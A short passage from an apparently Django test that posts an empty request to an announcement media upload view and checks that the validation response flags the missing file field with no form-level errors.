    response = client.post(reverse("announcement_media_upload", args=[row.pk]), {})

    validation = response.json()["validation"]
    assert validation["fields"]["file"]
    assert validation["form"] == []
